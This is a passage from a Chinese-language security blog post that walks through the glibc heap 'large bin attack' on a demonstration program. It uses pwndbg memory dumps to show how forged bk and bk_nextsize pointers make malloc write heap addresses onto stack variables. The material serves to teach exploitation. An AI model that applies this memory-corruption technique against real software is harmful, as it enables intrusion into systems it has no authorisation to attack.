    0x80: 0x0
    unsortedbin
    all: 0x6037a0 —▸ 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6037a0
    smallbins
    empty
    largebins
    0x400: 0x603360 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x603360 /* '`3`' */
    

p3也被放入了unsortedbin中,这里我们开始伪造p2

    
    
    pwndbg> x/10gx 0x603360
    0x603360:       0x0000000000000000      0x00000000000003f1
    0x603370:       0x0000000000000000      0x00007fffffffe5b0
    0x603380:       0x0000000000000000      0x00007fffffffe5a8
    0x603390:       0x0000000000000000      0x0000000000000000
    0x6033a0:       0x0000000000000000      0x0000000000000000
    

先修改了size为0x3f1,然后fd为0,fd->nextsize为0,bk为&stack_var-2而bk_size为&stack_var2-4,也就是指向了同一个地址:)

    
    
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x6037a0 —▸ 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6037a0
    smallbins
    empty
    largebins
    0x400 [corrupted]
    FD: 0x603360 ◂— 0x0
    BK: 0x603360 —▸ 0x7fffffffe5b0 ◂— 0x0
    

然后我们再malloc一下

    
    
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x603140 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603140 /* '@1`' */
    smallbins
    empty
    largebins
    0x400 [corrupted]
    FD: 0x603360 ◂— 0x0
    BK: 0x603360 —▸ 0x6037a0 —▸ 0x7fffffffe5b0 ◂— 0x6037a0
    

此时目标已经被修改了

    
    
    pwndbg> x/10gx &stack_var1
    0x7fffffffe5c0: 0x00000000006037a0      0x00000000006037a0
    0x7fffffffe5d0: 0x0000000000603010      0x0000000000603370
    0x7fffffffe5e0: 0x00000000006037b0      0xd047b69e2685f100
    0x7fffffffe5f0: 0x0000000000400a30      0x00007ffff7a2d830
    0x7fffffffe600: 0x0000000000000000      0x00007fffffffe6d8
    pwndbg> x/10gx &stack_var2
    0x7fffffffe5c8: 0x00000000006037a0      0x0000000000603010
    0x7fffffffe5d8: 0x0000000000603370      0x00000000006037b0
    0x7fffffffe5e8: 0xd047b69e2685f100      0x0000000000400a30
    0x7fffffffe5f8: 0x00007ffff7a2d830      0x0000000000000000
    0x7fffffffe608: 0x00007fffffffe6d8      0x0000000100000000
    pwndbg> p/x stack_var1
    $20 = 0x6037a0
    pwndbg> p/x stack_var2
    $21 = 0x6037a0
    

###  总结

本例中,程序先是在栈上创建了两个变量stack_var1和stack_var2并赋初值为0,这两个变量就是即将要被覆写的变量

随后申请了一个large chunk p1,然后又申请了一个小chunk来避免后面的操作引发合并,之后又申请了一个large chunk
p2,之后还是一个避免合并的小chunk,下面申请p3的操作类似

随后程序释放了p1,p2,此时两个chunk被链入unsorted bin中

之后为了将p2放入large bin,程序又申请了一个小chunk对p1进行切割,一部分还给用户,一部分继续放进unsorted
bin中,然后系统将p2放入了large bin中

之后Free掉了p3,现在p3也在unsorted bin中

好了,现在程序伪造了p2的内容,将p2->bk_nextsize指向stack2-4,p2->bk指向stack1-2

再malloc一个小chunk,这个时候程序就会将p3放入large bin中,系统就会调用从unsorted bin中取出large
bin的操作,将堆地址存入了栈上

over~

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **知世** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/197649](/post/id/197649)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)

 **+1** __3赞

 __收藏

![](https://p3.ssl.qhimg.com/t01b60c9bd9051ba29f.png) 知世

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

